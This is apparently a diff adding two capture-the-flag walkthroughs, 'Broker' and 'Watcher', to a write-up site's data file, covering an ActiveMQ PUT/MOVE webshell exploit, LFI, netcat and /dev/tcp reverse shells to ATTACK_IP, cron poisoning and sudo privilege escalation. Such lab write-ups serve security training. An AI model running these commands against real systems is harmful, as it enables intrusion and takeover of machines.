@@ -192,5 +192,160 @@ root@wwbuddy:~# <span class="tok-func">cat</span> /root/root.txt
 
 <h3>7 · Retrospective</h3>
 <p>Attack chain: second-order SQLi password reset → log-poisoned PHP shell → MySQL log credential leak → birthday bruteforce → SUID env-var injection. Lessons: sanitize every place a username is reused, keep MySQL's general log off, and never trust environment variables in SUID binaries.</p>`
+  },
+
+  'broker': {
+    title: 'Broker — MQTT Eavesdrop to Webshell',
+    meta: { diff: 'medium', platform: 'thm', time: '15 min' },
+    content: `
+<h2>Broker — MQTT Eavesdrop to Root</h2>
+<p>An ActiveMQ server with two exposed services: an MQTT broker that lets anyone subscribe, and a management console with a classic put-shell CVE. Paul and Max thought they were being sneaky. Goal: flag.txt + root.txt.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-comment"># The hint says the action is on high ports</span>
+<span class="tok-func">nmap</span> -sC -sV -p 1001-9999 broker.thm
+
+PORT    STATE SERVICE
+1883/tcp open  mqtt
+8161/tcp open  http   Jetty 9 (Apache ActiveMQ 5.9.0)</code></pre>
+
+<h3>2 · ActiveMQ Console</h3>
+<p>Port 8161 hosts an Apache ActiveMQ dashboard. The default <code>admin:admin</code> works. The <strong>Topics</strong> tab lists a <code>secret_chat</code> topic — that has to be where the "secret" messages flow.</p>
+
+<h3>3 · Eavesdropping on MQTT</h3>
+<p>The MQTT broker needs no credentials, so we subscribe to the topic with the Mosquitto client and read the conversation.</p>
+<pre><code><span class="tok-func">mosquitto_sub</span> -h broker.thm -t <span class="tok-string">'secret_chat/#'</span> -p <span class="tok-num">1883</span> -V mqttv31
+<span class="tok-comment"># &gt; Paul and Max chat about... the game "Hacknet"</span></code></pre>
+
+<h3>4 · CVE-2016-3088 — PUT/MOVE Webshell</h3>
+<p>ActiveMQ's <code>/fileserver</code> accepts an HTTP <code>PUT</code> upload but won't execute what's stored there. So we upload a JSP webshell and <code>MOVE</code> it into <code>/admin</code>, which does execute JSP. First leak the absolute path via the <code>%20</code> trick.</p>
+<pre><code><span class="tok-comment"># Upload cmd.jsp to /fileserver</span>
+<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">PUT</span> <span class="tok-string">"http://broker.thm:8161/fileserver/cmd.jsp"</span> \
+  --data @cmd.jsp -H <span class="tok-string">'Content-Type: text/plain'</span>
+
+<span class="tok-comment"># Leak the absolute path</span>
+<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">GET</span> <span class="tok-string">"http://broker.thm:8161/fileserver/test/%20/%20"</span>
+<span class="tok-comment"># &gt; /opt/apache-activemq-5.9.0/webapps/fileserver/</span>
+
+<span class="tok-comment"># MOVE the shell into the executable /admin directory</span>
+<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">MOVE</span> <span class="tok-string">"http://broker.thm:8161/fileserver/cmd.jsp"</span> \
+  -H <span class="tok-string">"Destination: http://broker.thm:8161/admin/cmd.jsp"</span>
+
+<span class="tok-comment"># RCE</span>
+http://broker.thm:8161/admin/cmd.jsp?cmd=<span class="tok-func">id</span></code></pre>
+
+<h3>5 · Reverse Shell</h3>
+<p>Long bash one-liners often get mangled by URL encoding here. Use <code>nc -e</code> or host a <code>msfvenom</code>-generated ELF and fetch it with curl. Then upgrade the TTY.</p>
+<pre><code><span class="tok-comment"># Attacker listener</span>
+<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>
+
+<span class="tok-comment"># Payload (URL-encode spaces) through the webshell</span>
+<span class="tok-func">nc</span> -e /bin/bash <span class="tok-string">ATTACK_IP</span> <span class="tok-num">4444</span>
+
+<span class="tok-comment"># Upgrade TTY, then read the user flag</span>
+<span class="tok-func">python3</span> -c <span class="tok-string">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="tok-func">cat</span> /home/activemq/flag.txt
+<span class="tok-comment"># THM{...}</span></code></pre>
+
+<h3>6 · Privesc — Writable Sudo Script</h3>
+<p><code>sudo -l</code> shows activemq can run <code>subscribe.py</code> as root with no password — and the file is owned (and writable) by activemq. Append code that drops a shell.</p>
+<pre><code><span class="tok-func">sudo</span> -l
+(root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
+<span class="tok-func">ls</span> -l /opt/apache-activemq-5.9.0/subscribe.py
+-rw-rw-r-- <span class="tok-num">1</span> activemq activemq <span class="tok-num">768</span> subscribe.py
+
+<span class="tok-func">echo</span> <span class="tok-string">'import os; os.system("/bin/bash")'</span> &gt;&gt; /opt/apache-activemq-5.9.0/subscribe.py
+
+<span class="tok-func">sudo</span> -u root /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
+<span class="tok-comment"># &gt; root shell</span>
+root@broker:~# <span class="tok-func">cat</span> /root/root.txt
+<span class="tok-comment"># THM{...}</span></code></pre>
+
+<h3>7 · Retrospective</h3>
+<p>Attack chain: default ActiveMQ creds → MQTT eavesdrop → PUT/MOVE webshell (CVE-2016-3088) → writable sudo script. Lessons: never run a broker with null auth, lock down <code>/fileserver</code>, and audit what your own user-scripted sudo targets.</p>`
+  },
+
+  'watcher': {
+    title: 'Watcher — LFI to Root in 7 Flags',
+    meta: { diff: 'medium', platform: 'thm', time: '30 min' },
+    content: `
+<h2>Watcher — LFI to Root in 7 Flags</h2>
+<p>A boot2root with a long, linear privilege chain: LFI turns into a webshell, then a series of sudo/cron pivots, ending with a root SSH key. Goal: 7 flags.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-func">nmap</span> -sC -sV watcher.thm
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp    vsftpd 3.0.3
+22/tcp open  ssh
+80/tcp open  http   Apache</code></pre>
+
+<h3>2 · LFI → FTP Credentials</h3>
+<p><code>post.php</code> does a raw <code>include $_GET["post"]</code> — instant LFI. Use it to read <code>robots.txt</code>, which points to <code>secret_file_do_not_read.txt</code>, which leaks FTP credentials and the upload path.</p>
+<pre><code><span class="tok-comment"># Any file, no filtering</span>
+http://watcher.thm/post.php?post=<span class="tok-string">/etc/passwd</span>
+
+<span class="tok-comment"># robots → secret file → FTP creds</span>
+http://watcher.thm/post.php?post=robots.txt
+<span class="tok-comment"># Allow: /flag_1.txt | Allow: /secret_file_do_not_read.txt</span>
+http://watcher.thm/post.php?post=secret_file_do_not_read.txt
+<span class="tok-comment"># &gt; ftpuser : &lt;password&gt; — files go to /home/ftpuser/ftp/files</span></code></pre>
+
+<h3>3 · FTP Upload → Reverse Shell</h3>
+<p>Log into FTP: grab <code>flag_2.txt</code>, then <code>put</code> a PHP reverse shell into the writable <code>files/</code> directory. Trigger it through the LFI using the path from the note.</p>
+<pre><code><span class="tok-func">ftp</span> watcher.thm
+&gt; get flag_2.txt
+&gt; cd files
+&gt; put shell.php
+
+<span class="tok-comment"># Listener + trigger via LFI</span>
+<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>
+http://watcher.thm/post.php?post=<span class="tok-string">../../../../home/ftpuser/ftp/files/shell.php</span>
+<span class="tok-comment"># &gt; shell as www-data — flag_3.txt in /var/www/html/more_secrets_a9f10a/</span></code></pre>
+
+<h3>4 · www-data → toby</h3>
+<pre><code><span class="tok-comment"># Passwordless sudo to toby</span>
+<span class="tok-func">sudo</span> -u toby /bin/bash
+<span class="tok-comment"># &gt; toby shell — flag_4.txt in /home/toby</span></code></pre>
+
+<h3>5 · toby → mat (cron poisoning)</h3>
+<p><code>/etc/crontab</code> runs <code>/home/toby/jobs/cow.sh</code> as user <code>mat</code> every minute. As toby we can overwrite it with a reverse shell and wait.</p>
+<pre><code><span class="tok-func">cat</span> /etc/crontab
+<span class="tok-comment"># * * * * * mat /home/toby/jobs/cow.sh</span>
+
+<span class="tok-func">echo</span> <span class="tok-string">'/bin/bash -i &gt;&amp; /dev/tcp/ATTACK_IP/5555 0&gt;&amp;1'</span> &gt; /home/toby/jobs/cow.sh
+<span class="tok-func">chmod</span> +x /home/toby/jobs/cow.sh
+<span class="tok-comment"># &gt; wait a minute → mat shell → flag_5.txt</span></code></pre>
+
+<h3>6 · mat → will (module injection)</h3>
+<p>Will left a note: mat may run <code>will_script.py</code> as will via sudo. It imports <code>get_command</code> from a local <code>cmd.py</code> that mat can edit — override the function to drop a shell while still returning a whitelisted command.</p>
+<pre><code><span class="tok-func">sudo</span> -l
+<span class="tok-comment"># (will) /usr/bin/python3 /home/mat/scripts/will_script.py</span>
+
+<span class="tok-func">cat</span> &gt; /home/mat/scripts/cmd.py &lt;&lt; <span class="tok-string">'EOF'</span>
+<span class="tok-keyword">import</span> os
+<span class="tok-keyword">def</span> <span class="tok-func">get_command</span>(num):
+    os.system(<span class="tok-string">"/bin/bash -i"</span>)
+    <span class="tok-keyword">return</span> <span class="tok-string">"id"</span>
+EOF
+
+<span class="tok-func">sudo</span> -u will /usr/bin/python3 /home/mat/scripts/will_script.py <span class="tok-num">1</span>
+<span class="tok-comment"># &gt; will shell — flag_6.txt</span></code></pre>
+
+<h3>7 · will → root (base64 SSH key)</h3>
+<p>User <code>will</code> is in the <code>adm</code> group, which can read <code>/opt/backups/</code>. Inside is <code>key.b64</code> — decode it and it's an RSA private key for root.</p>
+<pre><code><span class="tok-func">id</span>
+uid=<span class="tok-num">1000</span>(will) groups=<span class="tok-num">1000</span>(will),<span class="tok-num">4</span>(adm)
+
+<span class="tok-func">ls</span> /opt/backups
+key.b64
+
+<span class="tok-func">base64</span> -d key.b64 &gt; key
+<span class="tok-func">file</span> key   <span class="tok-comment"># PEM RSA private key</span>
+<span class="tok-func">chmod</span> <span class="tok-num">600</span> key
+<span class="tok-func">ssh</span> -i key root@localhost
+<span class="tok-comment"># &gt; root — final flag</span></code></pre>
+
+<h3>8 · Retrospective</h3>
+<p>Attack chain: LFI → FTP creds → uploaded PHP shell → sudo/cron pivots (www-data→toby→mat→will) → base64 root key. Lessons: raw <code>include</code> is a shell factory, cron scripts must not be world-writable, and running python <code>while</code> importing a file your users can edit is a root factory.</p>`
   }
 };
